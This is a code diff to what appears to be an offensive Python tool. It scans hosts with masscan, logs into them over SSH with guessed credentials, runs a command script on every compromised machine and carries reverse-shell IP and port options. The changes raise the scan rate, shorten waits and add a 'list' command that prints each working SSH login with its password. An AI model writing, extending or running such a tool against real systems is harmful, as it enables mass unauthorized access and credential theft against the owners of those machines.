@@ -57,6 +57,7 @@ def executeCommands(attempt):
     except paramiko.ssh_exception.AuthenticationException:
         sys.stderr.write(colored('[!!!]', 'red') + '%s@%s login failed.\n' % (attempt[2], attempt[0]))
         client.close()
+        del sucessfulAttempts[attempt]
         return
     while running:
         barrier.wait()
@@ -88,6 +89,7 @@ def executeCommands(attempt):
                     sys.stderr.write(colored('[!!!]','red') + '%s@%s unable to establish SFTP. %s\n' % (attempt[2], attempt[0], str(e)))
         barrier.wait()
     client.close()
+    del sucessfulAttempts[attempt]
 
 def chunks(l, n):
     for i in range(0, len(l), n):
@@ -179,7 +181,7 @@ def main():
             hostsToScan = ' '.join(config['netcfg']['hosts'])
             portsToScan = ','.join(config['netcfg']['ports'])
             try:
-                scanWithMetadata = scaner.scan(hostsToScan, portsToScan, arguments='--wait %d' % (args.wait))
+                scanWithMetadata = scaner.scan(hostsToScan, portsToScan, arguments='--wait %d --rate 20000' % (args.wait))
             except (masscan.PortScannerError, masscan.NetworkConnectionError) as e:
                 sys.stderr.write(colored('[!!!]', 'red') + "Error running scan: %s\n" % str(e))
                 exit(1)
@@ -278,6 +280,9 @@ def main():
                         print("%s %s@%s wrote sucessfully\n" % (colored("[###]",'green'), attempt[2], attempt[0]))
             elif option in 'exit':
                 break
+            elif option in 'list':
+                for attempt in sucessfulAttempts:
+                    print(colored('[###]', 'green'), 'ssh %s@%s -p %d password: %s' % (attempt[2],attempt[0],attempt[1], attempt[3]))
     except KeyboardInterrupt:
         print(colored('\n[###]', 'blue'), 'Finishing final operation.')
     running = False
@@ -300,7 +305,7 @@ if __name__ == '__main__':
     parser.add_argument('--retry', action="store_true", default=False)
     parser.add_argument('-c', '--commandsToRun', type=str, default='fun.sh')
     parser.add_argument('-t','--numThreads', type=int, default=5)
-    parser.add_argument('-w', '--wait', type=int, default=3)
+    parser.add_argument('-w', '--wait', type=int, default=1)
     parser.add_argument('--reverseIP', type=str, default=get_ip())
     parser.add_argument('--reversePort', type=str, default='5967')
     args = parser.parse_args()
